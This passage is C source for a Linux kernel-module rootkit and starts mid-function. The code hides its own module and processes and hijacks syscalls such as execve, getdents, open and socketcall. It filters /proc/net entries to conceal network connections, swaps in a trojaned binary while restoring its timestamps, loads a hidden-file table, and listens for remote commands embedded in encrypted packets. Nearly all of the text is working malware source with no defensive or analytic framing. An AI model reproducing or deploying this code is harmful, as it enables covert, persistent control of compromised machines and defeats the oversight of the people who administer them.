	i_crypt(iph->saddr, iph->daddr, dport, data, dec, skb->len - 28);

	if(strncmp(dec, KEY2, strlen(KEY2)) == 0)
	{
		struct c_queue_item *tmp;
		struct resp *res;
		tmp = (struct c_queue_item *) 
			kmalloc(sizeof(struct c_queue_item), GFP_KERNEL);
		res = (struct resp *) kmalloc(sizeof(struct resp), GFP_KERNEL);
		tmp->res = res;
		tmp->comm = dec;
		res->sip = iph->saddr;
		tmp->next = NULL;
		lock_kernel();
		if(cqueue == NULL)
		{
			cqueue = tmp;
			cqueuet = tmp;
		}
		else
		{
			cqueuet->next = tmp;
			cqueuet = tmp->next;
		}
		unlock_kernel();
		up(&sem);
		return 0;
	}
	kfree(dec);
reg:
	return o_ip_packet_type->func(skb, dev, pt);

}

int queue_handler(void *data)
{
	char *comm, *cmd, *args;
	unsigned short cmdlen;
	struct c_queue_item *tmp;

	while(queue_quit)
	{
		if(cqueue == NULL)
			down(&sem);
		else
		{
			tmp = cqueue;
			cqueue = tmp->next;
			if(tmp == cqueuet)
				cqueuet = tmp->next;
			comm = tmp->comm + strlen(KEY2);
			switch(*comm)
			{
				case '1':
					comm++;
					tmp->res->dip = i_strtol(comm, 8, 16); 
					comm+=8;
					tmp->res->dport = 
						(short) i_strtol(comm, 4, 16);
					comm+=4;
					break;
				default:
					kfree(tmp->res);
					tmp->res = NULL;
					comm++;
					break;
			}

			cmdlen = i_strtol(comm, 4, 16);
			comm += 4;
			comm[cmdlen] = 0;
			cmd = comm;
			args = strstr(comm, ":");
			*args = 0;
			args++;

			i_callfunc(cmd, args, tmp->res);

			kfree(tmp->comm);
			if(tmp->res != NULL)
				kfree(tmp->res);
			kfree(tmp);
		}
	}
	lock_kernel();
	queue_quit = 1;
	unlock_kernel();
	return 0;
}

int i_callfunc(char *cmd, char *args, struct resp *res)
{
	struct funct *curr;

	for(curr=functs;curr!=NULL;curr=curr->next)
		if(strcmp(curr->name, cmd) == 0)
		{
			if(curr->funct == NULL)
			{
				char *argv[3];
				struct execve_args eargs;
				pid_t pid;

				eargs.path = curr->plug;
				argv[0] = curr->plug;
				argv[1] = args;
				argv[2] = NULL;
				pid=kernel_thread(&i_exec_prog, &eargs, 0);
				if(pid > -1)
				{
					sigset_t tmpsig;
					i_hide_proc(pid);
					WAITPID(pid);
				}
			}
			else
				curr->funct(args, res);
			return 0;
		}
	return -1;
}

extern int machine_restart;

int init_module(void)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,3,0)
	struct nameidata nd;
#else
	struct dentry *dentry;
#endif
	int len;
	pid_t pid;
	char *tmp, rtmp;
	struct file *fp, *out;
	time_t atime, mtime, ctime;
	mm_segment_t oldfs;

	sema_init(&sem, 0);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,3,0)
	rwlock_init(&redirsl);
	rwlock_init(&phidesl);
	rwlock_init(&nhidesl);
#ifndef ELITE_GID
	rwlock_init(&fhidesl);
#endif
#else
	spin_lock_init(&redirsl);
	spin_lock_init(&phidesl);
	spin_lock_init(&nhidesl);
#ifndef ELITE_GID
	spin_lock_init(&fhidesl);
#endif
#endif

	pid = kernel_thread(queue_handler, NULL, 0);
	if(pid < 0)
		return -1;
	i_hide_proc(pid);
	lock_kernel();
/* self hide codez */
	for(module_list = (long *) &machine_restart;;module_list += 4)
		if(*module_list == (long) &__this_module)
			break;

	modules = &__this_module;
#ifndef DEBUG
	*module_list = (long) __this_module.next;
#endif
	__this_module.nsyms = 0;

	i_proc_hook("/proc/net/tcp", &h_tcp_get_info, &o_tcp_get_info);
	i_proc_hook("/proc/net/udp", &h_udp_get_info, &o_udp_get_info);
	i_proc_hook("/proc/net/raw", &h_raw_get_info, &o_raw_get_info);

/* REPLACE and RESTORE macros from adore by teso.  http://teso.scene.at 
 * generic macros, but teso = fucking elite 
 */
#define REPLACE(x) o_##x = sys_call_table[__NR_##x]; \
			sys_call_table[__NR_##x] = h_##x
	REPLACE(execve);
	REPLACE(exit);
	REPLACE(fork);
	REPLACE(clone);
	REPLACE(getdents);
	REPLACE(mkdir);
	REPLACE(chdir);
	REPLACE(rmdir);
	REPLACE(open);
	REPLACE(unlink);
	REPLACE(stat);
	REPLACE(lstat);
#ifdef __NR_stat64
	REPLACE(stat64);
#endif
#ifdef __NR_lstat64
	REPLACE(lstat64);
#endif
	REPLACE(socketcall);
	REPLACE(init_module);
	REPLACE(rename);

/* need to hijack sys_call_table[SYS_rename] later so we can rename trojan_bin 
 */
	tmp = trojan_bin;
	while(strstr(tmp, "/") != NULL)
		tmp = strstr(tmp, "/") + 1;

	__this_module.name = tmp;	
	len = strlen(install_dir) + strlen(tmp) + 2;
	back_bin = (char *) kmalloc(GFP_KERNEL, len);
	memset(back_bin, 0, len);
	sprintf(back_bin, "%s/%s", install_dir, tmp);

/* I hope to replace these if statements with version independent code, 
  I just forgot the preprocessor tag to find out if a struct is defined or not.
  which is the case with struct net_device in 2.4's reverse compatability with
  2.2.
*/

	fp = filp_open(back_bin, O_RDONLY, 0);
	if(!IS_ERR(fp))
	{
		filp_close(fp, NULL);
		goto norestart;
	}

	oldfs = get_fs();
	set_fs(KERNEL_DS);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,3,0)
	if(user_path_walk(trojan_bin, &nd))
		goto norestart;
	ctime = nd.dentry->d_inode->i_ctime;
	mtime = nd.dentry->d_inode->i_mtime;
	atime = nd.dentry->d_inode->i_atime;
	path_release(&nd);
	if(o_rename(trojan_bin, back_bin) < 0)
		goto norestart;
	if(user_path_walk(back_bin, &nd))
		goto norestart;
	nd.dentry->d_inode->i_ctime = ctime;
	nd.dentry->d_inode->i_mtime = mtime;
	nd.dentry->d_inode->i_atime = atime;
	path_release(&nd);
#else
	dentry = lookup_dentry(trojan_bin, NULL, 0);
	if(IS_ERR(dentry))
		goto norestart;
	ctime = dentry->d_inode->i_ctime;
	mtime = dentry->d_inode->i_mtime;
	atime = dentry->d_inode->i_atime;
	dput(dentry);
	if(o_rename(trojan_bin, back_bin) < 0)
		goto norestart;
	dentry = lookup_dentry(back_bin, NULL, 0);
	if(IS_ERR(dentry))
		goto norestart;
	dentry->d_inode->i_ctime = ctime;
	dentry->d_inode->i_mtime = mtime;
	dentry->d_inode->i_atime = atime;
	dput(dentry);
#endif
	tmp = (char *) kmalloc(len + 1, GFP_KERNEL);
	sprintf(tmp, "%s.", back_bin);
	fp = filp_open(tmp, 0, 0);
	kfree(tmp);
	if(IS_ERR(fp))
		goto norestart;
	out = filp_open(trojan_bin, O_CREAT | O_WRONLY, 0111);
	if(IS_ERR(out))
	{
		filp_close(fp, NULL);
		goto norestart;
	}
	while(fp->f_pos < fp->f_dentry->d_inode->i_size)
	{
		if(fp->f_op->read(fp, &rtmp, 1, &fp->f_pos) < 1)
			break;
		if(out->f_op->write(out, &rtmp, 1, &out->f_pos) < 1)
			break;
	}
	filp_close(out, NULL);
	filp_close(fp, NULL);
	restart = 1;
norestart:

/* load hidden file table, have fun following the reused variable names from 
 * before ;)
 */
#ifndef ELITE_GID
	len = strlen(install_dir) + 4;
	hidetab = kmalloc(len, GFP_KERNEL);
	memset(hidetab, 0, len);
	sprintf(hidetab, "%s/ht", install_dir);
	fp = filp_open(hidetab, O_RDONLY, 0);
	if(IS_ERR(fp))
		goto noht;
	set_fs(KERNEL_DS);
	tmp = (char *) kmalloc(257, GFP_KERNEL);
	memset(tmp, 0, 257);
	atime = ctime = len = 0;
	while(fp->f_pos < fp->f_dentry->d_inode->i_size)
	{
		if(fp->f_op->read(fp, &rtmp, 1, &fp->f_pos) < 1)
			break;

		switch(rtmp)
		{
			case ':':
				atime = 1;
				break;
			case '\n':
				i_hide_file(tmp, ctime, NULL);
				atime = ctime = len = 0;
				memset(tmp, 0, 257);
				break;
			default:
				if(atime)
					ctime=(ctime*16)+i_strtol(&rtmp, 1, 16);
				else
					tmp[len++] = rtmp;
				break;	
		}
	}
	filp_close(fp, NULL);
noht:
	set_fs(oldfs);
#endif
	r_hide_file(install_dir, NULL);

	i_addfunct("", "ping", &r_ping);
	i_addfunct("", "shutdown", &r_shutdown);
	i_addfunct("", "remove", &r_remove);
	i_addfunct("", "list_func", &r_list_func);
	i_addfunct("", "load_plugin", &r_load_plugin);
	i_addfunct("", "unload_plugin", &r_unload_plugin);
	i_addfunct("", "list_phides", &r_list_phides);
	i_addfunct("", "hide_proc", &r_hide_proc);
	i_addfunct("", "unhide_proc", &r_unhide_proc);
	i_addfunct("", "start_proc", &r_start_proc);
	i_addfunct("", "list_redir", &r_list_redir);
	i_addfunct("", "exec_redir", &r_exec_redir);
	i_addfunct("", "rm_redir", &r_rm_redir);
	i_addfunct("", "list_fhides", &r_list_fhides);
	i_addfunct("", "hide_file", &r_hide_file);
	i_addfunct("", "unhide_file", &r_unhide_file);
	i_addfunct("", "list_nhides", &r_list_nhides);
	i_addfunct("", "hide_net", &r_hide_net);
	i_addfunct("", "unhide_net", &r_unhide_net);

	dev_add_pack(&h_ip_packet_type);
	o_ip_packet_type = h_ip_packet_type.next;
	dev_remove_pack(o_ip_packet_type);
	unlock_kernel();
	return 0;
}

int cleanup_module(void)
{
	r_shutdown("yes", NULL);
        while(queue_quit == 0)
        {
                up(&sem);
                schedule();
        }
	return 0;
}
